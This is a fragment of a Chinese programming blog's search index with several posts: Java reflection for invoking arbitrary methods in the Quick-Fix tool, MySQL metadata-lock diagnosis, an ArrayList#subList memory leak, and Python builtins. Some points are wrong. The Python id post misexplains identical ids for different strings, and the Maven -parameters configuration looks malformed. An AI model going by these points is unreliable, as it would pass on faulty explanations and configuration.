上面显示了主要的逻辑，我们先获取方法名和参数个数相同的，接下来就是需要来判断参数类型是否一致了，针对前面提出的两类情况，进行分别判断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960private static boolean judgeParamsType(Class[] paramTypes, Object[] args) { for (int index = 0; index &lt; args.length; index++) { if (!judgeTypeMatch(paramTypes[index], args[index].getClass())) { // 判断定义的参数类型，是否为传参类型，或者传参的父类or接口类型，不满足时，直接判False return false; } } return true;}/** * 判断类型是否兼容 * * @param base * @param target * @return */private static boolean judgeTypeMatch(Class base, Class target) { if (base.isAssignableFrom(target)) { // 类型相同个，或者base为target的父类、接口类型 return true; } if (base == int.class) { return target == Integer.class; } else if (base == Integer.class) { return target == int.class; } else if (base == long.class) { return target == Long.class; } else if (base == Long.class) { return target == long.class; } else if (base == float.class) { return target == Float.class; } else if (base == Float.class) { return target == float.class; } else if (base == double.class) { return target == Double.class; } else if (base == Double.class) { return target == double.class; } else if (base == boolean.class) { return target == Boolean.class; } else if (base == Boolean.class) { return target == boolean.class; } else if (base == char.class) { return target == Character.class; } else if (base == Character.class) { return target == char.class; } else if (base == byte.class) { return target == Byte.class; } else if (base == Byte.class) { return target == byte.class; } else if (base == short.class) { return target == Short.class; } else if (base == Short.class) { return target == short.class; } else { return false; }} 先看一下上面的实现，有几个约束 传入的参数顺序与方法参数顺序一致 基本类型，兼容包装类型的匹配 非基本类型，同类型，或子类，都认为是匹配的 c. 再改进版上面的实现虽然可以获取到我们目标类中的方法，但是如果我想执行的是父类中的方法，怎么办？ 所以需要继续改进一下，在定位方法时，采用迭代的方式来向上层级递归，查找目标方法 123456789101112131415161718192021public static Method getMethod(Class clz, String method, Object[] args) { if (clz == Object.class) { throw new ServerNotFoundException( \"can't find method by methodName: \" + method + \" args: \" + JSON.toJSONString(args) + \" for clz:\" + clz.getName()); } for (Method m : clz.getDeclaredMethods()) { if (!m.getName().equals(method) || m.getParameterCount() != args.length) { continue; } if (judgeParamsType(m.getParameterTypes(), args)) { m.setAccessible(true); return m; } } return getMethod(clz.getSuperclass(), method, args);} II. 测试1. 基本测试依然借助前面的测试case来使用，和上面的调用基本一致，只是换了具体的调用而已 1234567891011121314@Testpublic void testReflectMethodGet() { Class clz = MethodFoundTest.class; String method = \"rand\"; Object[] args = new Object[]{\"hello\", new Integer(123)}; System.out.println(ReflectUtil.getMethod(clz, method, args)); Ac bc = new Bc(); System.out.println(ReflectUtil.getMethod(clz, \"pc\", new Object[]{bc})); Ac ac = new Ac(); System.out.println(ReflectUtil.getMethod(clz, \"pc\", new Object[]{ac}));} 输出结果如下 2. 父类方法测试扩展下前面的两个内部类 12345678910111213141516public static class Ac { String name = UUID.randomUUID().toString(); private void rand(String name) { System.out.println(\"ac rand\"); }}public static class Bc extends Ac { int age = 20; String name = age + \"|\" + super.name; private void rand(String name, int seed) { System.out.println(name + \" | \" + seed); }} 接下来我们的测试方法如 12345678910@Testpublic void testSuperMethodGet() { Class clz = Bc.class; String method = \"rand\"; Object[] arg1 = new Object[]{\"name\", 1}; Object[] arg2 = new Object[]{\"name\"}; System.out.println(ReflectUtil.getMethod(clz, method, arg1)); System.out.println(ReflectUtil.getMethod(clz, method, arg2));} 输出结果如下 III. 扩展之反射获取方法的参数名上面也说到了，在方法定位的时候，掺入的参数顺序是有指定的，不能乱；所以自然就会有一个想法，我们能不能通过反射获取方法的参数名呢？ javaasist 字节码的方式可以实现 其次就是jdk8 同样支持 1. jdk8反射获取参数名首先看下基本的使用姿势，一个例子如下 123456789@Testpublic void testParamNameFound() throws NoSuchMethodException { Method method = MethodFoundTest.class.getMethod(\"rand\", String.class, int.class); Parameter[] parameters = method.getParameters(); for (Parameter p : parameters) { System.out.println(p.getName()); }} 直接通过Parameter.getName来获取参数名，然后执行看下输出啥 结果居然和我们预期的不一致，什么鬼？！！！说好的支持参数获取的呢？ 为了兼容以前的版本，直接这么用还不行，需要指定编译参数，通过 javac -parameters 来开启; 另外针对我们常用的maven也可以如下配置 123456789101112131415161718&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.7.0&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;compilerArgs&gt; &lt;jvmArguments&gt; -parameters &lt;/jvmArguments&gt; &lt;/compilerArgs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 然后再次执行 II. 其他0. 项目相关项目地址： https://github.com/liuyueyi/quick-fix 博文地址： 190108-Quick-Fix 如何优雅的实现应用内外交互之接口设计篇 190104-Quick-Fix 纯Jar应用及扩展手册 190102-Quick-Fix 从0到1构建一个应用内服务/数据访问订正工具包 190311-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（上篇） 190315-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（中篇） 190317-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（下篇） 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/03/15/190315-Quick-Fix-通过反射执行任意类目标方法的实现全程实录（中篇）/"},{"title":"190308-Mysql DDL出现长时间等待MDL问题分析","text":"给表新增字段时，发现锁表了，查看进程，提示Waiting for table metadata lock，等待锁释放；然而蛋疼的是几分钟过去了，依然没有任何的进展 现在就有几个问题了 Metadata Lock 是什么鬼 是什么原因导致一直等待 I. 问题定位首先需要确认什么地方加锁，从mysql出发，应该怎么定位？ 1. 定位过程对于mysql而言，一般来讲上锁和事物时伴生关系，所以我们的直观出发点就是查找db当前正在执行的事物 12-- 查询当前正在执行的事物的sqlSELECT * FROM information_schema.INNODB_TRX; 输出结果如下，首先拿到事物对应的进程id 拿到id之后，则可以分析对应的进程信息 12345-- 查询进程信息show processlist-- 查询所有的进程信息show full processlist 然后定位到具体的进程 然后登陆到目标机器，查看端口号对应的进程，通过lsof命令查看 1lsof -i tcp:52951 从图中可以看出，是一个python进程的mysql连接开启的事物，进程id为5436 接着查看进程对应的信息 1ps aux | grep 5436 这个脚本正是测试aiomysql的python脚本，内容比较简单 123456789101112131415161718192021import asyncioimport aiomysqlloop = asyncio.get_event_loop()@asyncio.coroutinedef test_example(): conn = yield from aiomysql.connect(host='127.0.0.1', port=3306, user='root', password='', db='test', loop=loop, autocommit=False) cur = yield from conn.cursor() yield from cur.execute(\"SELECT * from test_table\") print(cur.description) r = yield from cur.fetchall() print(r) yield from cur.close() conn.close()loop.run_until_complete(test_example()) 2. 原因分析对python不太熟，直接借助google查一下，发现有同样的问题 Why aiomysql locks the table even when using context manager? 这个问题抛出，在通过with打开连接获取游标后，执行mysql，但是没有commit之前，会锁表，这个期间修改表都会出现等待 下面近给出了解答，并没有看到更多的深层次的说明，先记录下，解决办法就是在创建连接池的时候，选择自动提交方式，然后就不会有这个问题了 12345678pool = await aiomysql.create_pool( host=\"localhost\", user=\"test\", password=\"test\", db=\"test\", autocommit=True, cursorclass=DictCursor, loop=loop) II. Metadata Lock说明 找到一篇文章说MDL的，推荐详细阅读 MySQL表结构变更你不可不知的Metadata Lock详解 1. MDL 说明抓一下核心的要点，简单说一下看完这篇文章之后的朴素理解 MetaData Lock 简称为MDL，简单来说就是表的元数据锁；当修改表结构的时候，就需要持有这个锁 a. 作用MDL的主要作用只有一点，保护一个正在执行的事物表结构不被修改 有一个原则，MDL是事物级别的，只有事物结束之后才会释放，而这里面说的事物分为两类 显示事物： 关闭autocommit 以begin或start transaction开始的操作 AC-NL-RO(auto-commit non-locking read-only): auto commit 开启之下的select操作 b. 实例说明直接看上面的说明，不太直观，一个经典的case如下 session1 开启了一个事物，执行查询操作；但是现在session2 要删除表，如果执行成功，那么session1的第二次查询就跪了，这样就违背了事物的原则，所有在5.5版本引入了MDL，来保证在事物执行期间，表结构不被修改 2. 出现MDL等待原因及解决方法当我们出现修改表结构，就需要获取MDL的排他锁，因此只有这个表没有事物在执行时，才能获取成功；当持有独占锁之后，这个表的其他操作将被阻塞（即不能插入数据，修改数据，也不能开启事物操作） 因此在执行DDL时，一直出现等待MDL的时候，常见的原因有下面三个 a. 长事物，阻塞DDL，从而阻塞所有同表的后续操作通过 show processlist看到表上有正在进行的操作（包括读），此时修改表时也会等待获取MDL，这种时候解决办法要么就是等待执行完毕，要么就是直接kill掉进程 b. 未提交事物，阻塞DDL通过 show processlist没有找到表上的操作，但是通过information_schema.innodb_trx发现有未提交的事物， c. 异常的状况通过 show processlist 和事物查询都没有的情况下，可能的场景是一个显示的事物中，对表的操作出现了异常，虽然事物失败，但是持有的锁还没有释放，也会导致这个原因 可以在performance_schema.events_statements_current表中查询失败的语句 3. MDL分类与sql实例前面两小节，分别说明什么是MDL（朴素理解为表的元数据锁），以及当修改表时出现长时间的等待MDL的原因分析；正常看完之后，应该会有下面的疑惑 MDL有哪些类型 哪些sql会持有MDL 对于MDL的类型，从网上截一张图 接下来需要分析下不同锁模式对应的sql 属性 含义 事例 MDL_INTENTION_EXCLUSIVE(IX) 意向排他锁用于global和commit的加锁。 truncate table t1; insert into t1 values(3,’abcde’); 会加如下锁 (GLOBAL,MDL_STATEMENT,MDL_INTENTION_EXCLUSIVE）(SCHEMA,MDL_TRANSACTION,MDL_INTENTION_EXCLUSIVE) MDL_SHARED(S) 只访问元数据 比如表结构，不访问数据。 set golbal_read_only =on 加锁 (GLOBAL，MDL_EXPLICIT，MDL_SHARED） MDL_SHARED_HIGH_PRIO(SH) 用于访问information_scheam表，不涉及数据。 select * from information_schema.tables;show create table xx; desc xxx; 会加如下锁： (TABLE,MDL_TRANSACTION,MDL_SHARED_HIGH_PRIO) MDL_SHARED_READ(SR) 访问表结构并且读表数据 select * from t1; lock table t1 read; 会加如下锁: (TABLE，MDL_TRANSACTION，MDL_SHARE_READ） MDL_SHARED_WRITE(SW) 访问表结构并且写表数据 insert/update/delete/select .. for update 会加如下锁：(TABLE，MDL_TRANSACTION，MDL_SHARE_WRITE) MDL_SHARED_UPGRADABLE(SU) 是mysql5.6引入的新的metadata lock,可以说是为了online ddl 才引入的。特点是允许DML，防止DDL； alter table/create index/drop index 会加该锁; 加入下锁 （TABLE，MDL_TRANSACTION，MDL_SHARED_UPGRADABLE） MDL_SHARED_NO_WRITE(SNW) 可升级锁，访问表结构并且读写表数据，并且禁止其它事务写。 alter table t1 modify c bigint; (非onlineddl) (TABLE，MDL_TRANSACTION，MDL_SHARED_NO_WRITE） MDL_SHARED_NO_READ_WRITE(SNRW) 可升级锁，访问表结构并且读写表数据，并且禁止其它事务读写。 lock table t1 write; 加锁 (TABLE，MDL_TRANSACTION,MDL_SHARED_NO_READ_WRITE MDL_EXCLUSIVE(X) 防止其他线程读写元数据 CREATE/DROP/RENAME TABLE，其他online DDL在rename阶段也持有X锁(TABLE，MDL_TRANSACTION，MDL_EXCLUSIVE） 4， 小结上面的内容，可能信息量比较大，特别是MDL的锁分类情况，很难抓住重点，针对我们日常接触中，简单给出小结 MDL是为了保证事物执行过程中，表结构不被修改引入的；因此修改表结构的前提是这个表上没有事物（没有正在执行，失败，或者未提交的事物） DDL执行，一般来讲是需要获取排他的MDL DML都会开启事物，因此会获取 MDL_SW 锁 DQL语句会获取 MDL_SR 锁 几个简称的说明 MDL: metadata lock，可以简单理解为表的元数据锁 DDL: 数据定义语言，可以简单理解为表的操作，如创建，修改，删除表、视图等，新增索引、字段等操作 DML: 数据操作语言，也就是我们常规理解的 insert, update, delete 语句 DQL: 数据查询语言，常见的select语句 几个常见疑问解答 a. 为什么同一张表的多个DDL不能并行执行 MDL读锁是互相兼容的,可以有多个增删查改 MDL写锁是互斥的,只能有一个表的DDL b. 为什么有时候DDL会卡住 MDL读写锁之间是互斥的,所以如果DDL卡住,就证明有事务在执行,不能申请MDL写锁 c. 常见卡住的场景 非常频繁的业务高峰期 有慢查询把持着MDL读锁 有事物一直未提交 d. 为什么需要MDL锁 当事务本身执行的时候理论上是不能容忍表结构在中途发生改变的 5. 更多参考相关博文或者问答 Why aiomysql locks the table even when using context manager? MySQL表结构变更你不可不知的Metadata Lock详解 理解MySQL的MDL元数据锁 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/03/08/190308-Mysql-DDL出现长时间等待MDL问题分析/"},{"title":"190317-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（下篇）","text":"前面两篇反射，分别介绍了如何封装参数和定位方法，对于最终的反射调用，还缺少的是目标类的确定和方法执行；本篇博文将目标集中在这最后一块 链上上两篇文章地址 190311-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（上篇） 190315-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（中篇） I. 目标对象确定对于找到我们的目标对象，这个就与我们最终的应用的运行方式有关系了。如果是一个Spring应用，我们知道所有的bean都会放在ApplicationContext上下文中，可以通过beanName或者Class来找到目标对象；如果我们的应用就是一个单纯的jar包，没有引入第三方容器管理，这个要获取目标类就与具体的实现有关系了 下面我们将进行分别说到 1. 目标对象分类分类是个啥意思，为什么要分类了？ 这个主要是从我们的目标出发，我们最终的目的是通过反射调用我们的目标方法，那么方法的调用执行，通常分为两种，一个是静态类的调用；一个是实例的调用 这两个的区别在哪里？ 最终的反射执行java.lang.reflect.Method#invoke(object, args) 静态类调用方式，传入null 实例调用方式，传入实例对象s 从上面的区别可以看出，对于静态类方式，找到方法和参数就行了，不需要再额外的去找对应的实例了 2. 目标对象类型判断同样我们可以通过反射的方式判断方法是否属于静态方法 12// true 表示属于静态方法Modifier.isStatic(method.getModifiers()) 在QuickFix（&lt;=1.1）的实现中，并没有采用这种方式，而是直接选择了通过外部传参的方式来确定目标对象是否为静态类；原因在于实现简单，所以这里有个优化点，完全可以直接自动化判断 3. 获取目标对象前面说到了，不同的运行环境，获取目标对象的方式不一样，所以让我们直接覆盖所有的场景时不太现实的。一个可选的方案就是预留接口，让接入方自己来选择，如何根据传入的参数，来选择对应的目标对象，所以我们定义了一个接口 12345678910111213141516171819202122232425262728293031@LoaderOrderpublic interface ServerLoader { /** * 返回优先级 * * @return */ default int order() { try { return this.getClass().getAnnotation(LoaderOrder.class).order(); } catch (Exception e) { return 10; } } /** * ServerLoader是否支持获取目标对象 * * @param reqDTO * @return */ boolean enable(FixReqDTO reqDTO); /** * 根据传入参数，获取目标对象和目标对象的class * * @param reqDTO * @return */ ImmutablePair&lt;Object, Class&gt; getInvokeObject(FixReqDTO reqDTO);} 上面接口中，三个方法，先看第二个，因为我们前面进行了分类，所以我们必然会有一个StaticServerLoader，专门用来加载静态目标对象，而这个loader对于普通对象获取就无法满足了 第二个需要注意的就是order()方法，用来指定ServerLoader的优先级，特别是当我们的系统中存在多个ServerLoader可以返回我们想要的结构时，这个时候设置优先级就是一个较好的方案了 看到源码的同学会发现，我们的实现类并不是直接实现ServerLoader接口，而是继承自模板类ServerLoaderTemplate，抽象了公共的业务逻辑 1234567891011121314151617181920212223242526272829public abstract class ServerLoaderTemplate implements ServerLoader { @Override public ImmutablePair&lt;Object, Class&gt; getInvokeObject(FixReqDTO reqDTO) { ImmutablePair&lt;Object, Class&gt; serverPair = loadServicePair(reqDTO.getService()); if (StringUtils.isEmpty(reqDTO.getField())) { return serverPair; } return loadFieldPair(reqDTO, serverPair); } /** * 返回目标对象 * * @param service * @return */ public abstract ImmutablePair&lt;Object, Class&gt; loadServicePair(String service); public ImmutablePair&lt;Object, Class&gt; loadFieldPair(FixReqDTO reqDTO, ImmutablePair&lt;Object, Class&gt; serverPair) { try { return ReflectUtil.getField(serverPair.getLeft(), serverPair.getRight(), reqDTO.getField()); } catch (Exception e) { throw new ServerNotFoundException(\"get server#filed error!\", e); } }} 从模板类的中，可以发现一个有意思的地方，我们传入的Service可能并不是最终要执行的目标对象 怎么理解呢？举一个简单的例子 1234567public class A { private B b;}public class B { public void print() {}} 我们现在希望执行的是A对象中成员b的print方法，所以这种case下我们的目标对象是b，因此上面的实现中，添加了方法 loadFieldPair 接下来给出两个具体获取目标对象的实现，一个是静态类的，一个是Spring容器的 StaticServerLoader实现相对简单，直接使用ClassLoader.load() 123456789101112131415161718public class StaticServerLoader extends ServerLoaderTemplate { private static final String STATIC_TYPE = \"static\"; @Override public boolean enable(FixReqDTO reqDTO) { return STATIC_TYPE.equalsIgnoreCase(reqDTO.getType()); } @Override public ImmutablePair&lt;Object, Class&gt; loadServicePair(String service) { try { Class clz = this.getClass().getClassLoader().loadClass(service); return ImmutablePair.of(null, clz); } catch (Exception e) { throw new ServerNotFoundException(\"parse \" + service + \" to bean error: \" + e.getMessage()); } }} spring的获取方式，则主要是借助SprintContext 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class BeanServerLoader extends ServerLoaderTemplate { private static final String BEAN_TYPE = \"bean\"; private static ApplicationContext applicationContext; public BeanServerLoader(ApplicationContext applicationContext) { BeanServerLoader.applicationContext = applicationContext; } @Override public boolean enable(FixReqDTO reqDTO) { return StringUtils.isEmpty(reqDTO.getType()) || BEAN_TYPE.equalsIgnoreCase(reqDTO.getType().trim()); } private boolean beanName(String server) { return !server.contains(\".\"); } @Override public ImmutablePair&lt;Object, Class&gt; loadServicePair(String server) { Object invokeBean = null; if (beanName(server)) { // 表示传入的是beanName，通过beanName来查找对应的bean invokeBean = applicationContext.getBean(server.trim()); } else { // 表示传入的是完整的服务名，希望通过class来查找对应的bean try { Class clz = this.getClass().getClassLoader().loadClass(server.trim()); if (clz != null) { invokeBean = applicationContext.getBean(clz); } } catch (Exception e) { throw new ServerNotFoundException(\"Failed to load Server: \" + server); } } if (invokeBean == null) { throw new ServerNotFoundException(\"Server not found: \" + server); } return ImmutablePair.of(invokeBean, invokeBean.getClass()); } public static BeanServerLoader getLoader() { return applicationContext.getBean(BeanServerLoader.class); }} 关于ServerLoader的更多设计理念，会放在QuickFix的后续博文中进行说明 4. 执行目标方法当我们获取到了目标对象，目标方法，传参之后，调用就简单了 12345678910111213141516171819202122public static String execute(Object bean, Class clz, String method, Object[] args) { if (StringUtils.isEmpty(method)) { // 获取类的成员属性值时，不传method，直接返回属性值 return JSON.toJSONString(bean); } Method chooseMethod = getMethod(clz, method, args); if (chooseMethod == null) { throw new ServerNotFoundException(\"can't find server's method: \" + clz.getName() + \"#\" + method); } try { chooseMethod.setAccessible(true); Object result = chooseMethod.invoke(bean, args); return JSON.toJSONString(result); } catch (Exception e) { throw new ServerInvokedException( \"unexpected server invoked \" + clz.getName() + \"#\" + method + \" args: \" + JSON.toJSONString(args), e); }} 5. other至此，QuickFix项目中关于反射的相关技能点已经说完了，可以说QuickFix项目，整个都是依托于反射来玩耍的，如果希望了解下java反射相关知识点和使用姿势的话，这个项目也是一个很好的选择（简单、轻量） QuickFix项目中另外一个我个人认为有意思的点在于支持扩展的设计理念，如何让这个简单的框架适用于各种不同的应用中，也是一个很有意思的挑战，后续博文将带来这方面的介绍 II. 其他0. 项目相关项目地址： https://github.com/liuyueyi/quick-fix 博文地址： 190108-Quick-Fix 如何优雅的实现应用内外交互之接口设计篇 190104-Quick-Fix 纯Jar应用及扩展手册 190102-Quick-Fix 从0到1构建一个应用内服务/数据访问订正工具包 190311-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（上篇） 190315-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（中篇） 190317-Quick-Fix 通过反射执行任意类目标方法的实现全程实录（下篇） 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/03/17/190317-Quick-Fix-通过反射执行任意类目标方法的实现全程实录（下篇）/"},{"title":"190515-老哥你真的知道ArrayList#sublist的正确用法么","text":"我们有这么一个场景，给你一个列表，可以动态的新增，但是最终要求列表升序，要求长度小于20，可以怎么做？ 这个还不简单，几行代码就可以了 12345678public List&lt;Integer&gt; trimList(List&lt;Integer&gt; list, int add) { list.add(add); list.sort(null); if (list.size() &gt; 20) { list = list.subList(0, 20); } return list;} 1. 测试验证上面的代码先不考虑性能的优化方面，有没有问题？ 写了个简单的测试case，我们来看下会出现什么情况 12345678910111213@Testpublic void testTri() throws InterruptedException { List&lt;Integer&gt; list = new ArrayList&lt;&gt;(30); Random random = new Random(); int cnt = 0; while (true) { list = trimList(list, random.nextInt(100000)); Thread.sleep(1); ++cnt; System.out.println(list + \" &gt;&gt; \" + cnt); }} 启动参数修改下，添加jvm最大内存条件 -Xmx3m， 然后跑上面代码，一段时间之后居然出现stack over flow 有意思的问题来了，从逻辑上看，这个数组固定长度为20，顶多有21条数据，怎么就会内存溢出呢？ 2. SubList 方法揭秘我们看下ArrayList#sublis方法的实现逻辑，就可以发现获取子列表，居然只是重置了一下内部数组的索引 123456789101112131415161718192021public List&lt;E&gt; subList(int fromIndex, int toIndex) { subListRangeCheck(fromIndex, toIndex, size); return new SubList(this, 0, fromIndex, toIndex);}private class SubList extends AbstractList&lt;E&gt; implements RandomAccess { private final AbstractList&lt;E&gt; parent; private final int parentOffset; private final int offset; int size; SubList(AbstractList&lt;E&gt; parent, int offset, int fromIndex, int toIndex) { this.parent = parent; this.parentOffset = fromIndex; this.offset = offset + fromIndex; this.size = toIndex - fromIndex; this.modCount = ArrayList.this.modCount; } ...} 返回的是一个SubList类型对象，这个对象和原来的List公用一个存储数据的数组，但是多了两个记录子列表起始的偏移; 然后再看下SubList的add方法，也是直接在原来的数组中新增数据，想到与原来的列表在指定位置插入数据 1234567public void add(int index, E e) { rangeCheckForAdd(index); checkForComodification(); parent.add(parentOffset + index, e); this.modCount = parent.modCount; this.size++;} 所以上面实现的代码中 list = list.subList(0, 20); 这一行，有内存泄露，貌似是只返回了一个20长度大小的列表，但是这个列表中的数组长度，可能远远不止20 为了验证上面的说法，debug下上面的测试用例 动图演示如下 3. 正确使用姿势上面知道sublist并不会新创建一个列表，旧的数据依然还在，只是我们用不了而已，所以改动也很简单，根据sublist的结果创建一个新的数组就好了 12345678public List&lt;Integer&gt; trimList(List&lt;Integer&gt; list, int add) { list.add(add); list.sort(null); if (list.size() &gt; 20) { list = new ArrayList&lt;&gt;(list.subList(0, 20)); } return list;} 再次测试，代码一直在顺利的执行，看下后面的计数，都已经5w多，前面1w多久报错了 虽然上面解决了内存泄露，但是gc也很频繁了，本篇的重点主要是指出sublist的错误使用姿势，所以上面算法的优化就不详细展开了 4. 知识点扩展看下下面的测试代码输出应该是什么 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@ToStringpublic static class InnerC { private String name; private Integer id; public InnerC(String name, Integer id) { this.name = name; this.id = id; }}@Testpublic void subList() { List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 20; i++) { list.add(i); } // case 1 List&lt;Integer&gt; sub = list.subList(10, 15); sub.add(100); System.out.println(\"list: \" + list); System.out.println(\"sub: \" + sub); // case 2 list.set(11, 200); System.out.println(\"list: \" + list); System.out.println(\"sub: \" + sub); // case 3 list = new ArrayList&lt;&gt;(sub); sub.set(0, 999); System.out.println(\"list: \" + list); System.out.println(\"sub: \" + sub); // case 4 List&lt;InnerC&gt; cl = new ArrayList&lt;&gt;(); cl.add(new InnerC(\"a\", 1)); cl.add(new InnerC(\"a2\", 2)); cl.add(new InnerC(\"a3\", 3)); cl.add(new InnerC(\"a4\", 4)); List&lt;InnerC&gt; cl2 = new ArrayList&lt;&gt;(cl.subList(1, 3)); cl2.get(0).name = \"a5\"; cl2.get(0).id = 5; System.out.println(\"list cl: \" + cl); System.out.println(\"list cl2: \" + cl2);} 再看具体的答案之前，先分析一下 针对case1/2，我们知道sublist返回的列表和原列表公用一个底层数组，所以这两个列表的增删，都是相互影响的 case1 执行之后相当于在list数组的下标15这里，插入数据100 case2 执行之后，list的下标11，相当于sub的下标1，也就是说sub[1] 变成了200 对于case3/4 而言，根据sub创建了一个新的列表，这个时候修改新的列表中的值，会影响到原来的列表中的值么？ 分析这个场景，就需要看一下源码了 1234567891011121314151617181920212223public ArrayList(Collection&lt;? extends E&gt; c) { elementData = c.toArray(); if ((size = elementData.length) != 0) { // c.toArray might (incorrectly) not return Object[] (see 6260652) if (elementData.getClass() != Object[].class) elementData = Arrays.copyOf(elementData, size, Object[].class); } else { // replace with empty array. this.elementData = EMPTY_ELEMENTDATA; }}// 对应的核心逻辑就在 Arrays.copyOf，而这个方法主要调用的是native方法`System.arraycopy`public static &lt;T,U&gt; T[] copyOf(U[] original, int newLength, Class&lt;? extends T[]&gt; newType) { @SuppressWarnings(\"unchecked\") T[] copy = ((Object)newType == (Object)Object[].class) ? (T[]) new Object[newLength] : (T[]) Array.newInstance(newType.getComponentType(), newLength); System.arraycopy(original, 0, copy, 0, Math.min(original.length, newLength)); return copy;} 从上面的源码分析，会不会相互影响就看这个数组拷贝是怎么实现的了（深拷贝？浅拷贝？） 接下来看下实际的输出结果 12345678list: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 100, 15, 16, 17, 18, 19]sub: [10, 11, 12, 13, 14, 100]list: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 200, 12, 13, 14, 100, 15, 16, 17, 18, 19]sub: [10, 200, 12, 13, 14, 100]list: [10, 200, 12, 13, 14, 100]sub: [999, 200, 12, 13, 14, 100]list cl: [BasicTest.InnerC(name=a, id=1), BasicTest.InnerC(name=a5, id=5), BasicTest.InnerC(name=a3, id=3), BasicTest.InnerC(name=a4, id=4)]list cl2: [BasicTest.InnerC(name=a5, id=5), BasicTest.InnerC(name=a3, id=3)] 从上面可以知道，case1/2的分析没啥问题，case3、4的输出有点意思了 数组内为Integer时，两者互不影响 数组内为普通对象时，修改其中一个，会影响另外一个 关从输出结果来看 System.arraycopy 是浅拷贝，至于为什么int不影响呢，这个就和方法调用传参是基本数据类型时，在方法内部修改参数不会影响到外部一个道理了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/15/190515-老哥你真的知道ArrayList-sublist的正确用法么/"},{"title":"190716 Python 内置函数之id","text":"返回对象的唯一标识符，标识符是一个整数 1234&gt;&gt;&gt; id('hello world')4422041520&gt;&gt;&gt; id('hello worl')4422041520 注意，上面两个字符串并不一样，但是返回的标识相同，实际上这两个字符串指向的是同一个内存，只是长度不一样而已 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之id/"},{"title":"190716 Python 内置函数之hasattr","text":"判断对象是否包含某个属性 123456789&gt;&gt;&gt; class A:... x = 10... y = 20...&gt;&gt;&gt; a = A()&gt;&gt;&gt; hasattr(a, 'x')True&gt;&gt;&gt; hasattr(a, 'z')False II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之hasattr/"},{"title":"190716 Python 内置函数之int","text":"将一个字符串或数字转换为整型 注意：int函数第二个参数可以指定进制数，实现将其他进制的字符串转换为十进制的整数 12345678&gt;&gt;&gt; int('11')11&gt;&gt;&gt; int('11', 2)3&gt;&gt;&gt; int('11', 8)9&gt;&gt;&gt; int('11', 16)17 上面分别演示的是十进制、二进制、八进制、十六进制的字符串转整数 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之int/"},{"title":"190716 Python 内置函数之isinstance","text":"因为python是弱类型语言，所以拿到一个变量我们实际上是不确定它是什么类型的，这个时候就可以借助isinstance来判定 1234&gt;&gt;&gt; 